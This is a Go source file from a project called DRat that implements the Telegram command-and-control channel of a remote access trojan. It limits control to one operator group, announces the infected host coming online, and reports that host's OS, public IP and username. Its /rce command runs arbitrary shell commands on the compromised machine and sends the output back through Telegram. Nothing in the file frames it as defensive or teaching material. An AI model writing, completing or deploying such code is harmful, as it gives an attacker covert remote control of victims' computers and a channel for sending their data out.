/*
 * @Author: SpenserCai
 * @Date: 2023-03-05 21:40:21
 * @version:
 * @LastEditors: SpenserCai
 * @LastEditTime: 2023-03-12 21:24:56
 * @Description: file content
 */
package message

import (
	DRatAttack "DRat/attack"
	DRatConfig "DRat/config"
	DRatUtil "DRat/util"
	"runtime"
	"strings"

	tele "gopkg.in/telebot.v3"
)

// 自定义中间件，判定是否在群里，如果不在群里则不回复
func TeleMwIsInGroup(next tele.HandlerFunc) tele.HandlerFunc {
	return func(c tele.Context) error {
		if c.Chat().Type == "group" && c.Chat().ID == -int64(DRatConfig.TELBOT_CHAT_ID) {
			return next(c)
		} else {
			// 退出当前群
			if c.Chat().Type == "group" {
				defer DRatConfig.TelBot.Leave(c.Chat())
			}
			return c.Send("NOT ACCESS")
		}
	}
}

// 自定义中间件，判定是否被@，如果没有被@则不回复
func TeleMwIsAtBot(next tele.HandlerFunc) tele.HandlerFunc {
	return func(c tele.Context) error {
		if strings.Contains(c.Text(), "@"+DRatConfig.TelBot.Me.Username) {
			return next(c)
		}
		return nil
	}
}

func TeleBotCommand() {
	DRatConfig.TelBot.Use(TeleMwIsInGroup, TeleMwIsAtBot)
	DRatConfig.TelBot.Handle("/help", func(c tele.Context) error {
		helpMessage := "SpyAgent Telegram Bot Command List:\n" +
			"/help: Show this help message\n" +
			"/sysinfo: Show system information\n" +
			"/reboot_drat: Reboot DRat\n" +
			"/shutdown_drat: Shutdown DRat\n" +
			"/rce [command]: Execute command\n"
		return c.Send(helpMessage)
	})
	DRatConfig.TelBot.Handle("/rce", func(c tele.Context) error {
		cmdHelp := "Please input command:\n" +
			"init: Start RCE Server\n" +
			"stop: Stop RCE Server\n" +
			"command: Run command"
		// 读取命令的参数
		args := c.Args()
		args = args[:len(args)-1]
		if len(args) == 0 {
			return c.Send(cmdHelp)
		}
		argsStr := strings.Join(args, " ")
		if args[0] == "init" {
			// 如果RCE Server已经启动，则先关闭
			if DRatAttack.Rce.Status {
				DRatAttack.Rce.Close()
			}
			DRatAttack.Rce = &DRatAttack.DRce{}
			DRatAttack.Rce.Init()
			return c.Send("RCE Server Start")
		} else if args[0] == "stop" {
			// 如果RCE Server没有启动，则不执行关闭操作
			if !DRatAttack.Rce.Status {
				return c.Send("RCE Server Not Start")
			}
			DRatAttack.Rce.Close()
			return c.Send("RCE Server Stop")
		} else {
			// 如果RCE Server没有启动，则先启动
			if !DRatAttack.Rce.Status {
				DRatAttack.Rce = &DRatAttack.DRce{}
				DRatAttack.Rce.Init()
			}
			output, err := DRatAttack.Rce.Run(argsStr)
			if err != nil {
				return c.Send(err.Error())
			}
			return c.Send(output)
		}

	})
	DRatConfig.TelBot.Handle("/sysinfo", func(c tele.Context) error {
		sysInfo := ""
		// 获取操作系统
		sysInfo += "OS: " + runtime.GOOS + "\n"
		// 获取架构
		sysInfo += "Arch: " + runtime.GOARCH + "\n"
		// 获取公网IP
		publicIp, err := DRatUtil.GetPublicIp()
		if err != nil {
			return c.Send(err.Error())
		}
		sysInfo += "Public IP: " + publicIp + "\n"
		// 获取用户名
		currentUser, err := DRatUtil.GetCurrentUser()
		if err != nil {
			return c.Send(err.Error())
		}
		sysInfo += "User: " + currentUser.Username + "\n"
		return c.Send(sysInfo)

	})
	DRatConfig.TelBot.Handle("/reboot_drat", func(c tele.Context) error {
		err := DRatUtil.StartDrat()
		if err != nil {
			return c.Send(err.Error())
		} else {
			// 退出当前进程
			defer DRatUtil.ExitProcess()
		}
		return c.Send("DRat will rebooting...")
	})
	DRatConfig.TelBot.Handle("/shutdown_drat", func(c tele.Context) error {
		// 退出当前进程
		defer DRatUtil.ExitProcess()
		return c.Send("DRat will shutdown...")
	})
	DRatConfig.TelBot.Send(tele.ChatID(-DRatConfig.TELBOT_CHAT_ID), "DRat Online!")
	DRatConfig.TelBot.Start()
}
